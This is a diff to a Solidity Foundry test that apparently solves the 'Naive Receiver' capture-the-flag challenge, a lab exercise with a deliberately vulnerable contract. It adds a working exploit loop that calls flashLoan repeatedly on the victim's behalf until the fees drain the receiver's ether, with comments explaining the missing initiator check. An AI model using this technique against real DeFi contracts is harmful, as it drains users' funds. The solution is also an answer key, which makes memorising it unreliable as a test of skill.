@@ -48,7 +48,16 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        // because in flashLoanReceiver receiveEther function, just check sender equal to pool address
+        // doesn't check who initiate it
+        // so anyone can call flashloan function
+        // we call flashLoan multiple times to drain all of the ether from flashLoanReceiver
+        uint times = ETHER_IN_RECEIVER / naiveReceiverLenderPool.fixedFee();
+        vm.startPrank(attacker);
+        for (uint256 i = 0; i < times; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
